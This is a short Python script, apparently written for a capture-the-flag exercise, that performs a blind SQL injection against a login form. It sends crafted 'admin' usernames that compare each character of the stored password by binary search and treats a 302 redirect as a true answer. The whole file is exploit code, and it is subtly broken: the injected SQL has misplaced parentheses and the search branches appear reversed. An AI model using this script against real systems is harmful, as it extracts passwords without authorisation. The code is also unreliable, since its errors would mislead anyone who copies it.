import requests 

target_url = "" 
extracted_data = "" 

while not extracted_data.endswith("}"): 
    low, high = 32, 126 

    while low <= high:
        mid = (low + high) // 2

        injection_payload = f"admin' AND unicode(substr, password, {len(extracted_data) + 1}, 1)) > {mid} -- "
        
        post_data = {
            "username": injection_payload,
            "password": "password"
        }

        response = requests.post(target_url, data=post_data)

        if response.status_code == 302: 
            if low == high:
                extracted_data += chr(mid)
                print(f"found : {chr(mid)}")
                break
            high = mid
        else: 
            low = mid + 1
print(f"Extracted data: {extracted_data}")
